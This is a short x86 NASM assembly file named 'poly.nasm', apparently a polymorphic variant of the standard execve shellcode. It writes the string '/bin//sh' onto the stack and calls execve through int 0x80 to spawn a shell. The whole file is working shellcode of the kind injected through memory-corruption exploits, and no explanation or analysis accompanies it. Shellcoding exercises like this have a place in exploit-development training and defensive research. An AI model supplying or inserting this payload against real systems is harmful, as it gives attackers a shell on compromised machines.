; Filename: poly.nasm
; Author: Cole Strickler




global _start


section .text

_start:



	; push null dword
	xor eax, eax
	push eax



	mov dword [esp-4], 0x68732f2f
	mov dword [esp-8], 0x6e69622f

	sub esp, 8


	mov ebx, esp

	push eax
	mov edx, esp
	
	push ebx
	mov ecx, esp
	
	mov al, 11
	int 0x80
